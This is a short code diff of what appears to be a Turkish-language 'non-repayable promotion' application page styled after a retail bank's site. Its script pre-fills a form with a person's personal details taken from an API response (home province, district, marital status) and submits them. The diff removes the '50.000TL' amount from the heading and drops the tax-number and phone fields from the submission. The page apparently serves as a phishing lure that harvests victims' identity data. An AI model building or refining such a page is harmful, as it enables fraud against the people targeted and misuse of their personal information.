@@ -107,7 +107,7 @@
 <body class="is-retail is-turkish is-desktop is-nontouch">
   <div class="basvuru-container">
     <div class="basvuru-header">
-      <h1>50.000TL Geri Ödemesiz Promosyon!</h1>
+      <h1>Geri Ödemesiz Promosyon!</h1>
       <p>Lütfen bilgilerinizi kontrol edin ve eksik alanları doldurun</p>
     </div>
 
@@ -273,8 +273,6 @@
             memleketIl: apiData.MemleketIl || '',
             memleketIlce: apiData.MemleketIlce || '',
             medeniHal: apiData.MedeniHal || '',
-            vergiNumarasi: apiData.VergiNumarasi || '',
-            gsm: apiData.GSM ? (Array.isArray(apiData.GSM[0]) ? apiData.GSM[0][0] : apiData.GSM[0]) : '',
             type: 'basvuru'
           })
         })
